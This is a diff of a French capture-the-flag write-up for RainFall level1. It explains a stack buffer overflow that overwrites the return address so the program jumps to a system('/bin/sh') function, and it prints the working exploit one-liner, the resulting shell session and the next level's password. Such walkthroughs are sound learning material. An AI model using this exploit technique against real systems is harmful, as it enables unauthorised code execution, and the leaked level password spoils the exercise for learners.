@@ -13,12 +13,36 @@ Segmentation fault (core dumped)
 
 Reecriture du code source en C en utilisant objdump -d
 
+Fonction appelant "system(/bin/sh)" non appele dans le main
 
-level1@RainFall:~$ python -c 'print "\x90" * 76 + "\x44\x84\x04\x08"' | ./level1
+Documentation precedement lu sur le bufferoverflow -> https://beta.hackndo.com/buffer-overflow/
+
+Le segfault apparait car l'adresse de retour de la fonction (rEIP) a ete ecrase et redirige vers une adresse externe et refuse par le kernel
+
+Apres un certain nombre d'essais du programme avec une variation du nombres d'octets transmis, j'ai pu precisement trouver a quel endroit se situais l'rEIP : apres 76 caracteres (72 prevu pour la variable et 4 pour l'rEBP)
+
+Il faut alors placer l'adresse de la fonction appelant system("/bin/sh") a la place du rEIP pour appeler cette fonction.
+
+Dans le dump (objdump -d level1) il est indique que l'adresse de la fonction est 08048444.
+
+J'ai transmis alors cette adresse apres une conversion en little endian.
+
+"""
+level1@RainFall:~$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1
 Good... Wait what?
 Segmentation fault (core dumped)
+"""
 
-level1@RainFall:~$ python -c 'print "\x90" * 76 + "\x44\x84\x04\x08"' > /tmp/a && cat /tmp/a - | `pwd`/level1
+La fonction est bien appele mais le shell n'est pas disponible.
+
+Apres un essai avec l'execution de ltrace on voit bien que le shell est bien execute mais s'arrete avant de pouvoir l'utiliser.
+
+Je devine alors qu'il y a un probleme I/O, le shell a du s'arreter apres avoir detecter que son entree etait ferme
+
+Je stocke alors l'exploit dans un fichier et avec un "cat fichier -" je transmet l'exploit puis je redirige mon entree vers celle du programme
+
+"""
+level1@RainFall:~$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/a && cat /tmp/a - | `pwd`/level1
 Good... Wait what?
 ls
 ls: cannot open directory .: Permission denied
@@ -34,3 +58,4 @@ level2
 cat .pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 exit
+"""
